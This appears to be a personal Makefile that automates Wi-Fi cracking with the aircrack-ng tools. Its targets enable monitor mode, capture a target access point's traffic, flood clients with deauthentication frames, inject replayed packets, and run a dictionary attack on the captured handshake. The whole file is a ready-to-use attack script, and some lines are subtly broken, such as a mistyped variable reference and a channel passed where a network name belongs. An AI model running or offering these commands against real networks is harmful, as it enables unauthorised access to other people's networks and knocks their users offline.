
LocalMac	= a0:c5:89:77:47:78
LocalPort	= wlp1s0
ListenPort	= wlp1s0mon 
DocName		= lis
TargetMac	= 00:00:00:00:00:00
TargetChannel	= 1
Dictionary	= /home/eglym/Documents/Blasting_Dictionary/Blasting_dictionary/ful.txt
listen:		openlisten
	airodump-ng $(ListenPort)

openlisten:
	airmon-ng start $(LocalPort)

closelisten:
	airmon-ng stop $(ListenPort)

pointmac: 
	airodump-ng --bssid $(TargetMac) -c $(TargetChannel) -w $(DocName) $(ListenPort)

link:	
	aireplay-ng --deauth 100 -a  $(TargetMac) -e $(TargetChannel) -h $(LocalMac) $(ListenPort)	
#	aireplay-ng -1 0 -a $(TargetMac) -e $(TargetChannel) -h $(LocalMac) $(ListenPort)

zhuru:	
	aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b $(TargetMac) -h $(LocalMac) $(ListenPort)

pojie:
	aircrack-ng &(DocName)*.cap -w $(Dictionary)

makedictionary:
	g++ make_dictionary.cpp -o make_dictionary.out
	./make_dictionary.out
